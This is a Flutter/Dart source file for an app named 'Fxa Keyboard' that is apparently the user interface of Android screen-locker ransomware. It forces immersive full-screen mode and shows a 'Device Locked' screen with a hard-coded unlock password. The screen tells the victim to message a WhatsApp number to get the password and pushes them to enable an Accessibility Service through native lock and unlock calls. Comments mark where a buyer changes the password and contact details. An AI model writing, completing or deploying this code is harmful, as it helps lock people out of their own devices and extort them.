import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:url_launcher/url_launcher.dart';

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  SystemChrome.setEnabledSystemUIMode(SystemUiMode.immersiveSticky);
  runApp(const FxaApp());
}

class FxaApp extends StatelessWidget {
  const FxaApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'Fxa Keyboard',
      theme: ThemeData(
        colorScheme: ColorScheme.fromSeed(seedColor: Colors.deepPurple),
        useMaterial3: true,
      ),
      home: const RootGate(),
    );
  }
}

class RootGate extends StatefulWidget {
  const RootGate({super.key});

  @override
  State<RootGate> createState() => _RootGateState();
}

class _RootGateState extends State<RootGate> {
  static const platform = MethodChannel('fxa.lock/channel');
  bool _loading = true;
  bool _locked = true;

  @override
  void initState() {
    super.initState();
    _bootstrap();
  }

  Future<void> _bootstrap() async {
    final prefs = await SharedPreferences.getInstance();
    final locked = prefs.getBool('is_locked') ?? true;
    setState(() {
      _locked = locked;
      _loading = false;
    });
  }

  Future<void> _openAccessibilitySettings() async {
    try {
      await platform.invokeMethod('openAccessibilitySettings');
    } catch (_) {}
  }

  Future<void> _unlock(String password) async {
    if (password == 'fxa2024') { // ← change password here
      final prefs = await SharedPreferences.getInstance();
      await prefs.setBool('is_locked', false);
      try {
        await platform.invokeMethod('unlock');
      } catch (_) {}
      setState(() => _locked = false);
    }
  }

  Future<void> _relock() async {
    final prefs = await SharedPreferences.getInstance();
    await prefs.setBool('is_locked', true);
    try {
      await platform.invokeMethod('lock');
    } catch (_) {}
    setState(() => _locked = true);
  }

  @override
  Widget build(BuildContext context) {
    if (_loading) {
      return const Scaffold(
        body: Center(child: CircularProgressIndicator()),
      );
    }

    if (_locked) {
      return LockScreen(
        onUnlock: _unlock,
        onOpenSettings: _openAccessibilitySettings,
      );
    }

    return HomePage(onRelock: _relock);
  }
}

class LockScreen extends StatefulWidget {
  final Function(String) onUnlock;
  final VoidCallback onOpenSettings;

  const LockScreen({
    super.key,
    required this.onUnlock,
    required this.onOpenSettings,
  });

  @override
  State<LockScreen> createState() => _LockScreenState();
}

class _LockScreenState extends State<LockScreen> {
  final TextEditingController _ctrl = TextEditingController();
  String _error = '';

  // ← change these two lines
  static const String contactNumber = '+8801XXXXXXXXX';
  static const String contactId = '@your_id';

  @override
  void dispose() {
    _ctrl.dispose();
    super.dispose();
  }

  void _submit() {
    if (_ctrl.text.trim() == 'fxa2024') {
      widget.onUnlock(_ctrl.text.trim());
    } else {
      setState(() => _error = 'Wrong password');
      Future.delayed(const Duration(seconds: 1), () {
        if (mounted) setState(() => _error = '');
      });
    }
  }

  Future<void> _contact() async {
    final uri = Uri.parse('https://wa.me/$contactNumber');
    if (await canLaunchUrl(uri)) {
      await launchUrl(uri, mode: LaunchMode.externalApplication);
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF0B0B14),
      body: SafeArea(
        child: Padding(
          padding: const EdgeInsets.symmetric(horizontal: 28),
          child: Column(
            children: [
              const Spacer(flex: 2),
              const Icon(Icons.lock, size: 84, color: Colors.redAccent),
              const SizedBox(height: 20),
              const Text(
                'Device Locked',
                style: TextStyle(
                  color: Colors.white,
                  fontSize: 28,
                  fontWeight: FontWeight.bold,
                ),
              ),
              const SizedBox(height: 14),
              const Text(
                'Enter password to unlock.\n'
                'To get the password, send a message to:',
                textAlign: TextAlign.center,
                style: TextStyle(color: Colors.white60, fontSize: 14, height: 1.5),
              ),
              const SizedBox(height: 8),
              Text(
                contactNumber,
                style: const TextStyle(
                  color: Colors.amber,
                  fontSize: 16,
                  fontWeight: FontWeight.w600,
                ),
              ),
              Text(
                contactId,
                style: const TextStyle(color: Colors.amberAccent, fontSize: 14),
              ),
              const SizedBox(height: 32),
              TextField(
                controller: _ctrl,
                obscureText: true,
                style: const TextStyle(color: Colors.white, fontSize: 18),
                decoration: InputDecoration(
                  filled: true,
                  fillColor: const Color(0xFF1C1C2E),
                  hintText: 'Enter password',
                  hintStyle: const TextStyle(color: Colors.white38),
                  border: OutlineInputBorder(
                    borderRadius: BorderRadius.circular(14),
                    borderSide: BorderSide.none,
                  ),
                  contentPadding: const EdgeInsets.symmetric(
                    horizontal: 20,
                    vertical: 18,
                  ),
                ),
                onSubmitted: (_) => _submit(),
              ),
              if (_error.isNotEmpty) ...[
                const SizedBox(height: 10),
                Text(_error, style: const TextStyle(color: Colors.redAccent)),
              ],
              const SizedBox(height: 24),
              SizedBox(
                width: double.infinity,
                height: 52,
                child: ElevatedButton(
                  style: ElevatedButton.styleFrom(
                    backgroundColor: Colors.deepPurple,
                    foregroundColor: Colors.white,
                    shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(14),
                    ),
                  ),
                  onPressed: _submit,
                  child: const Text('Unlock', style: TextStyle(fontSize: 17)),
                ),
              ),
              const SizedBox(height: 16),
              TextButton(
                onPressed: _contact,
                child: const Text(
                  'Contact to get password',
                  style: TextStyle(color: Colors.amberAccent),
                ),
              ),
              const Spacer(flex: 2),
              TextButton(
                onPressed: widget.onOpenSettings,
                child: const Text(
                  'Enable Accessibility Service (required)',
                  style: TextStyle(color: Colors.white38, fontSize: 12),
                ),
              ),
              const SizedBox(height: 12),
            ],
          ),
        ),
      ),
    );
  }
}

class HomePage extends StatelessWidget {
  final VoidCallback onRelock;
  const HomePage({super.key, required this.onRelock});

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('Flutter Demo Home Page'),
        actions: [
          IconButton(
            icon: const Icon(Icons.lock),
            onPressed: onRelock,
          ),
        ],
      ),
      body: const Center(
        child: Text('Unlocked. Navigation works again.'),
      ),
      floatingActionButton: FloatingActionButton(
        onPressed: () {},
        child: const Icon(Icons.add),
      ),
    );
  }
}
